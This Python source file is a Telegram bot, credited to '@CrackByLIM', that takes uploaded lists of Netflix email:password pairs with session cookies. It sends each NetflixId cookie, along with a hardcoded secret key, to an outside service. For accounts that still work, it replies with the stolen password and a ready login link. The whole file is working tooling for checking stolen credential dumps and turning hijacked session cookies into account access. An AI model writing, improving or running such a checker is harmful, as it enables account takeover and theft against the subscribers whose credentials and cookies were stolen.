import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import os
from dotenv import load_dotenv
from pathlib import Path
import time
from collections import defaultdict
import asyncio
import re
import json

# Load environment variables
env_path = Path(__file__).parent / '.env'
load_dotenv(dotenv_path=env_path)

# Configuration
TOKEN = os.getenv('BOT_TOKEN')
API_URL = "http://genznfapi.onrender.com"
SECRET_KEY = "KUROSAKI1D_cP642DCEw0bxnMLHSIFlGZQjVh1RgSPM"

# YOUR CREDIT - This will replace all other credits
YOUR_CREDIT = "@CrackByLIM"

if not TOKEN:
    print("❌ ERROR: BOT_TOKEN not found!")
    exit(1)

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# User session storage
user_sessions = {}
rate_limits = defaultdict(list)

# Stats tracking
total_checks = 0
valid_accounts = 0
invalid_accounts = 0

# ==================== API FUNCTIONS ====================

async def check_netflix_id(netflix_id, email):
    """Check if Netflix ID is valid by calling the API"""
    try:
        url = f"{API_URL}/api/gen"
        data = {
            "netflix_id": netflix_id,
            "secret_key": SECRET_KEY
        }
        
        logger.info(f"Checking Netflix ID for {email}")
        
        response = requests.post(url, json=data, timeout=10)
        
        try:
            result = response.json()
        except:
            return {
                "success": False, 
                "error": "Invalid JSON response",
                "email": email
            }
        
        if result.get('success') == True:
            return {
                "success": True,
                "login_url": result.get('login_url'),
                "email": email,
                "data": result
            }
        else:
            return {
                "success": False,
                "error": result.get('error', 'Unknown error'),
                "error_code": result.get('error_code', 'UNKNOWN_ERROR'),
                "email": email
            }
                
    except Exception as e:
        return {
            "success": False, 
            "error": str(e),
            "email": email
        }

# ==================== FILE PARSING ====================

def parse_account_line(line):
    """Parse a single line from the accounts file"""
    try:
        line = line.strip()
        if not line or line.startswith('#'):
            return None
        
        account = {}
        
        # Extract email:password
        email_pass_match = re.match(r'^([^:]+):([^\s|]+)', line)
        if email_pass_match:
            account['email'] = email_pass_match.group(1).strip()
            account['password'] = email_pass_match.group(2).strip()
        else:
            return None
        
        # Extract Netflix Cookies
        cookie_match = re.search(r'NetflixCookies\s*=\s*(NetflixId=[^\s|]+)', line)
        if cookie_match:
            account['cookie'] = cookie_match.group(1).strip()
            # Extract NetflixId
            netflix_id_match = re.search(r'NetflixId=([^&\s]+)', cookie_match.group(1))
            if netflix_id_match:
                account['netflix_id'] = netflix_id_match.group(1).strip()
        
        # Extract other fields (optional)
        fields = {
            'country': r'Country\s*=\s*([^|\n]+)',
            'plan': r'Plan\s*=\s*([^|\n]+)',
            'video_quality': r'VideoQuality\s*=\s*([^|\n]+)',
            'max_streams': r'MaxStreams\s*=\s*([^|\n]+)',
        }
        
        for key, pattern in fields.items():
            match = re.search(pattern, line)
            if match:
                account[key] = match.group(1).strip()
        
        return account
    except Exception as e:
        logger.error(f"Error parsing line: {e}")
        return None

# ==================== RATE LIMITING ====================

def check_rate_limit(user_id, limit=5, period=60):
    now = time.time()
    rate_limits[user_id] = [t for t in rate_limits[user_id] if now - t < period]
    if len(rate_limits[user_id]) >= limit:
        return False
    rate_limits[user_id].append(now)
    return True

# ==================== BOT COMMANDS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command with premium formatting"""
    user = update.effective_user
    
    welcome = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎬 **NETFLIX ACCOUNT CHECKER BOT** 🎬
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👋 **Hello {user.first_name}!**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📤 **Send me a .txt file** with Netflix accounts
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 **Required Format:**
`email:password | NetflixCookies = NetflixId=... | Country = ...`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **What I'll Do:**
✅ Extract Netflix ID from each account
✅ Check validity with official API
✅ Send premium login links
✅ Show detailed statistics

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Commands:**
/help - Instructions
/stats - Statistics
/clear - Reset session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(welcome, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command with premium formatting"""
    help_text = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🆘 **HELP & INSTRUCTIONS** 🆘
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📁 **STEP 1: PREPARE YOUR FILE**
• Create a `.txt` file
• One account per line
• Must include NetflixCookies

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 **EXAMPLE FORMAT:**
`user@email.com:password123 | NetflixCookies = NetflixId=v%3D3%26ct%3D... | Country = USA`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚙️ **STEP 2: UPLOAD & PROCESS**
• Send the file to this chat
• Bot processes each account
• Valid accounts get login links

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **STEP 3: REVIEW RESULTS**
✅ Valid: Login link with button
❌ Invalid: Error message
📈 Final summary with stats

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⌨️ **COMMANDS:**
/start - Welcome message
/stats - View statistics
/clear - Clear your session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics with premium formatting"""
    global total_checks, valid_accounts, invalid_accounts
    
    success_rate = valid_accounts/total_checks*100 if total_checks > 0 else 0
    
    stats_text = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **GLOBAL STATISTICS** 📊
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📈 **Performance Metrics:**
• **Total Checks:** `{total_checks}`
• **✅ Valid:** `{valid_accounts}`
• **❌ Invalid:** `{invalid_accounts}`
• **📊 Success Rate:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **System Status:**
• **Bot:** 🟢 ONLINE
• **API:** 🟢 CONNECTED

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear user session"""
    user_id = update.effective_user.id
    if user_id in user_sessions:
        del user_sessions[user_id]
    await update.message.reply_text(
        f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **SESSION CLEARED**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

You can now upload a new file.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """,
        parse_mode='Markdown'
    )

# ==================== FILE HANDLER ====================

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded .txt files with premium formatting"""
    user_id = update.effective_user.id
    global total_checks, valid_accounts, invalid_accounts
    
    # Check rate limit
    if not check_rate_limit(user_id):
        await update.message.reply_text(
            f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ **RATE LIMIT EXCEEDED**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Please wait a minute before trying again.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )
        return
    
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
❌ **INVALID FILE TYPE**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Please upload a `.txt` file.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )
        return
    
    # Send initial message
    status_msg = await update.message.reply_text(
        f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📥 **FILE RECEIVED**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 **File:** `{document.file_name}`
⏳ **Status:** Downloading...

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """,
        parse_mode='Markdown'
    )
    
    try:
        # Download file
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        # Split into lines
        lines = content.split('\n')
        valid_lines = [l for l in lines if l.strip() and not l.startswith('#')]
        
        await status_msg.edit_text(
            f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **FILE ANALYZED**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 **File:** `{document.file_name}`
📝 **Total Lines:** `{len(lines)}`
✅ **Valid Entries:** `{len(valid_lines)}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔄 **Starting processing...**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )
        
        # Process each line
        results = []
        valid_count = 0
        invalid_count = 0
        
        for i, line in enumerate(valid_lines, 1):
            # Parse account
            account = parse_account_line(line)
            if not account or 'netflix_id' not in account:
                invalid_count += 1
                await update.message.reply_text(
                    f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
❌ **PARSING FAILED**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📧 **Line #{i}**
❌ Could not extract Netflix ID

💡 **Tip:** Make sure the line contains `NetflixCookies = NetflixId=...`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    """,
                    parse_mode='Markdown'
                )
                continue
            
            # Update progress every 3 accounts
            if i % 3 == 0 or i == len(valid_lines):
                progress = i / len(valid_lines)
                bar_length = 15
                filled = int(bar_length * progress)
                bar = "█" * filled + "░" * (bar_length - filled)
                
                await status_msg.edit_text(
                    f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔄 **PROCESSING ACCOUNTS**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 **Progress:** `{i}/{len(valid_lines)}`
📈 **Complete:** `{progress*100:.1f}%`
`{bar}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **Valid:** `{valid_count}`
❌ **Invalid:** `{invalid_count}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    """,
                    parse_mode='Markdown'
                )
            
            # Check with API
            email = account.get('email', 'Unknown')
            result = await check_netflix_id(account['netflix_id'], email)
            
            # Update global stats
            total_checks += 1
            
            if result.get('success'):
                valid_count += 1
                valid_accounts += 1
                
                # PREMIUM VALID ACCOUNT OUTPUT
                premium_msg = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **ACCOUNT VALIDATED** ✅
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📧 **LOGIN CREDENTIALS**
• **Email:** `{email}`
• **Password:** `{account.get('password', 'N/A')}`
• **Status:** ✅ ACTIVE

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌍 **ACCOUNT DETAILS**
• **Country:** `{account.get('country', 'N/A')}`
• **Plan:** `{account.get('plan', 'N/A')}`
• **Quality:** `{account.get('video_quality', 'N/A')}`
• **Max Streams:** `{account.get('max_streams', 'N/A')}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔗 **LOGIN LINK:**
`{result['login_url']}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ *Link expires after some time - use it now!*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                """
                
                keyboard = [[InlineKeyboardButton("🎬 LAUNCH NETFLIX", url=result['login_url'])]]
                
                await update.message.reply_text(
                    premium_msg,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode='Markdown'
                )
                
            else:
                invalid_count += 1
                invalid_accounts += 1
                error_msg = result.get('error', 'Unknown error')
                
                # Premium error message
                if 'SERVER_ERROR' in error_msg or '500' in error_msg:
                    fail_msg = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ **ACCOUNT EXPIRED**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📧 **Email:** `{email}`
❌ **Status:** INVALID/EXPIRED

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 **Reason:** Netflix ID has expired
💡 **Solution:** Get a fresh Netflix cookie

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    """
                else:
                    fail_msg = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
❌ **CHECK FAILED**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📧 **Email:** `{email}`
❌ **Error:** `{error_msg}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    """
                
                await update.message.reply_text(fail_msg, parse_mode='Markdown')
            
            # Small delay to avoid rate limits
            await asyncio.sleep(0.5)
        
        # PREMIUM FINAL SUMMARY
        success_rate = valid_count/(valid_count+invalid_count)*100 if (valid_count+invalid_count) > 0 else 0
        
        # Create status message based on results
        if invalid_count == 0:
            status_emoji = "🎉 ALL ACCOUNTS VALID"
            status_msg_text = "All accounts are valid! Great job!"
        elif valid_count > 0:
            status_emoji = "✅ PROCESSING COMPLETE"
            status_msg_text = f"{valid_count} valid, {invalid_count} invalid"
        else:
            status_emoji = "❌ NO VALID ACCOUNTS"
            status_msg_text = "No valid accounts found"
        
        summary = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{status_emoji}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 **FINAL STATISTICS**
• **Total Processed:** `{valid_count + invalid_count}`
• **✅ Valid:** `{valid_count}`
• **❌ Invalid:** `{invalid_count}`
• **📈 Success Rate:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **SUMMARY**
{status_msg_text}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 **NEXT STEPS**
• Use the login links above
• Save valid accounts securely
• Try fresh cookies for invalid ones

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """
        
        await status_msg.edit_text(summary, parse_mode='Markdown')
        
        # Store in session
        user_sessions[user_id] = {
            'last_file': document.file_name,
            'valid': valid_count,
            'invalid': invalid_count,
            'total': valid_count + invalid_count
        }
        
    except Exception as e:
        logger.error(f"Error processing file: {e}")
        await status_msg.edit_text(
            f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
❌ **ERROR OCCURRED**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 **File:** `{document.file_name}`
❌ **Error:** `{str(e)}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 Please try again or contact support

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )

# ==================== BUTTON CALLBACK ====================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()

# ==================== MAIN FUNCTION ====================

async def run_bot():
    """Run the bot"""
    print("=" * 60)
    print("🎬 PREMIUM NETFLIX ACCOUNT CHECKER")
    print("=" * 60)
    print(f"✅ Bot Token: {TOKEN[:10]}...")
    print(f"✅ API URL: {API_URL}")
    print(f"✅ Secret Key: {SECRET_KEY[:15]}...")
    print(f"✅ Credit: {YOUR_CREDIT}")
    print("=" * 60)
    print("🤖 Bot is running... Press Ctrl+C to stop")
    print("📝 Premium output formatting enabled")
    print("=" * 60)
    
    # Create application
    app = Application.builder().token(TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("clear", clear_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    # File handler
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
    
    # Initialize and start
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    finally:
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

def main():
    """Main entry point"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(run_bot())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == '__main__':
    main()
